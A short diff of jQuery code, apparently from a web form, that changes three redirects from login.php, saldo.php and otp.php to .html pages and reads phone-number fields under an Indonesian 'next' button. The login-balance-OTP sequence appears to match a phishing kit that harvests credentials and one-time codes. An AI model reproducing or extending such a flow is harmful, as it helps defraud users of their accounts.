@@ -23,7 +23,7 @@ $('.process1').fadeIn();
             
             complete: function(data) {
             setTimeout(function(){
-  window.location.href='login.php'
+  window.location.href='login.html'
   document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
  $('.process1').fadeOut();
     }, 800);
@@ -42,7 +42,7 @@ $('.process1').fadeIn();
             datatype: 'text',          
             complete: function(data) {
             setTimeout(function(){
-  window.location.href='saldo.php'
+  window.location.href='saldo.html'
   document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
  $('.process1').fadeOut();
     var nomortel = document.getElementById('nomorku').value;
@@ -68,7 +68,7 @@ $('.process1').fadeIn();
             datatype: 'text',          
             complete: function(data) {
             setTimeout(function(){
-  window.location.href='otp.php'
+  window.location.href='otp.html'
   document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
  $('.process1').fadeOut();
  var phone = document.getElementById("nomorsaya").value;
